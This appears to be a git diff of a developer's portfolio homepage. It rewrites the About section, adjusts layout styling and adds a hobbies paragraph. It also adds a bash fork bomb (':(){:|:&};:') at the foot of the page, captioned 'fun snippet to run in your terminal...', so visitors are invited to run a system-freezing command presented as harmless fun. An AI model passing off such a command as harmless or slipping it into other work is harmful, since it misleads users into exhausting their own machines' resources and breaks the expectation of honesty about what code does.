@@ -1,3 +1,4 @@
+import { Code } from "@heroui/code";
 import {
   DefaultLayout,
   Container,
@@ -11,6 +12,7 @@ import { ProjectCard } from "@/components/ProjectCard";
 import { Contact, contacts } from "@/components/Contact";
 
 export default function IndexPage() {
+  const forkBomb = ":(){:|:&};:";
   return (
     <DefaultLayout>
       <section id="#">
@@ -31,26 +33,54 @@ export default function IndexPage() {
 
       <Container>
         <Section header="About" id="about">
-          <SectionBody className="self-center lg:max-w-[60ch]">
-            <span className="font-bold">Hello 👋!</span>
+          <SectionBody className="self-center lg:max-w-[60ch] text-default-600">
+            <span className="text-default-800 font-bold text-xl">
+              Hello 👋!
+            </span>
             <p>
-              I am a recent grad year as a Computer Science student at
-              University of Victoria, with a strong focus on Networking and
-              Information Security. Beyond my academic pursuits, I'm deeply
-              passionate about Cryptography, Linux, and Free and Open Source
-              Software.
+              I’m a recent{" "}
+              <span className="text-default-800 font-bold">
+                Computer Science
+              </span>{" "}
+              graduate from the University of Victoria, specializing in&nbsp;
+              <span className="text-default-800 font-bold">
+                Computer Networking
+              </span>{" "}
+              and{" "}
+              <span className="text-default-800 font-bold">
+                Information Security
+              </span>
+              . My studies gave me a solid foundation in network protocols,
+              secure system design, and distributed computing, fueling my
+              interest in building secure, performant, and reliable software.
             </p>
+
             <p>
-              My journey through the tech industry has led me to roles at
-              various startups and freelancing opportunities, where I've
-              authored code as a full-stack software developer. These
-              experiences have introduced me to the modern web technologies, and
-              standard security practices.
+              I’ve worked as a{" "}
+              <span className="text-default-800 font-bold">
+                full-stack software developer
+              </span>{" "}
+              in both freelance and startup settings, where I built{" "}
+              <span className="text-default-800 font-bold">
+                client-facing applications
+              </span>
+              ,<span className="text-default-800">backend services</span>, and{" "}
+              <span className="text-default-800 font-bold">
+                secure authentication systems
+              </span>
+              . These roles sharpened my ability to deliver maintainable,
+              production-ready code across the stack.
             </p>
+
             <p>
-              Motivated to learn, I constantly seek to leverage my skills and
-              expertise to contribute meaningfully to the realms of
-              cybersecurity and open-source innovation.
+              Outside of tech, I enjoy{" "}
+              <span className="text-default-800 font-bold">rock climbing</span>,{" "}
+              <span className="text-default-800 font-bold">exercising</span>,
+              and I am an expert when it comes to{" "}
+              <span className="text-default-800 font-bold">
+                guitar noodling
+              </span>
+              !
             </p>
           </SectionBody>
         </Section>
@@ -58,7 +88,7 @@ export default function IndexPage() {
 
       <Container>
         <Section id="experiences" header="Experiences">
-          <SectionBody className="flex flex-col justify-center items-center gap-5 mx-auto">
+          <SectionBody className="flex flex-col justify-center items-center gap-8 mx-auto text-default-800">
             {experiences.map((exp, index) => (
               <ExperienceCard key={`exp${index}`} {...exp} />
             ))}
@@ -68,7 +98,7 @@ export default function IndexPage() {
 
       <Container>
         <Section id="projects" header="Projects">
-          <SectionBody className="flex flex-col justify-center items-center gap-5 mx-auto max-w-[65ch] w-full">
+          <SectionBody className="flex flex-col justify-center items-center gap-8 mx-auto">
             {projects.map((exp, index) => (
               <ProjectCard key={`exp${index}`} {...exp} />
             ))}
@@ -76,15 +106,20 @@ export default function IndexPage() {
         </Section>
       </Container>
 
-      <Container className="mb-10">
+      <Container className="mb-20">
         <Section id="contacts" header="Contacts">
-          <SectionBody className="flex flex-col justify-center items-start mx-auto">
+          <SectionBody className="flex flex-col md:flex-row md:gap-10 justify-center items-start mx-auto">
             {contacts.map((exp, index) => (
               <Contact key={`exp${index}`} {...exp} />
             ))}
           </SectionBody>
         </Section>
       </Container>
+
+      <span className="flex flex-col items-center mt-20 text-sm">
+        <span>fun snippet to run in your terminal...</span>
+        <Code>{forkBomb}</Code>
+      </span>
     </DefaultLayout>
   );
 }
